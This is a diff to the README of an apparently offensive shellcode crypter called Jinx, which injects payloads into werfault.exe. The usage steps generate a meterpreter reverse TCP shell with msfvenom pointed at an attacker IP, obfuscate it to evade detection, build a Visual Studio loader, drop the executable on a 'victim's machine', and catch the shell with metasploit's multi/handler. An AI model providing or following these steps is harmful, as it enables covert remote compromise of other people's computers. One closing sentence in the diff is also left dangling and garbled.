@@ -9,35 +9,30 @@
 - Process Injection - injecting the payload to werfault.exe
 
 ## Requirements
-Jinx requires [Python3](https://www.python.org/) and a C++ compiler to run (we will be using [Visual Studio](https://visualstudio.microsoft.com/vs/features/cplusplus/)).
+Jinx requires [Python3](https://www.python.org/) and [Visual Studio](https://visualstudio.microsoft.com/vs/features/cplusplus/) to run.
 
 ## Usage
-In this demonstration we will generate a shellcode using msfvenom in our kali machine:
+1. Clone the repository:
+```bash
+git clone <url>
+```
+
+2. Generate the shellcode. In this demonstration we will use msfvenom in a kali machine:
 ```bash
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<Attacker IP> LPORT=1337 -f raw -o shellcode
 ```
 
-Next we will use the obfuscator.py tool to obfuscate the shellcode:
+3. Put the shellcode in the cloned repository and use the obfuscator.py tool to obfuscate it.<br>Note: Our shellcode then be obfuscated to - **obfuscatedPayload.bin** with the key - **key.bin** and saved in loader/Jinx.
 ```bash
-python3 obfuscator.py <Path to the shellcode>/shellcode
+python3 obfuscator.py shellcode
 ```
-Our shellcode then be obfuscated and saved in - **obfuscatedPayload.bin** with the key - **key.bin**.
 
-Open Visual Studio, create a project and drop the following files into the project's directory:
+4. Open loader/Jinx.sln, the Visual Studio solution file.
+5. Build The project (Recommended: change the build configuration from Debug to Release).<br>Note: The executable file will be located at loader/x64/Release/Jinx.exe or loader/x64/Debug/Jinx.exe, depends on the build configuration.
 
-base64.cpp, main.cpp, ntdll.cpp, base64.h, ntdll.h, resource.h, resource.rc ,key.bin, obfuscatedPayload.bin
 
-![project's_directory](https://gitlab.com/RonKon/crypter/-/blob/develop/images/project's_directory.PNG?raw=true)
 
-then import the files as follow:
-
-- Headers Files > right click > Add > Existing Item > (base64.h, ntdll.h, resource.h)
-- Resource Files > right click > Add > Existing Item > (resource.rc ,key.bin, obfuscatedPayload.bin)
-- Source Files > right click > Add > Existing Item > (base64.cpp, main.cpp, ntdll.cpp)
-
-Build The project and drop the executable in the victim's machine.
-
-![solution_explorer](https://gitlab.com/RonKon/crypter/-/blob/develop/images/solution_explorer.PNG?raw=true)
+with the release option (optional) and drop the executable onto the victim's machine.
 
 On the attacker's machine use metasploit's multi/handler on port 1337 and on the victim's machine execute Jinx.
 
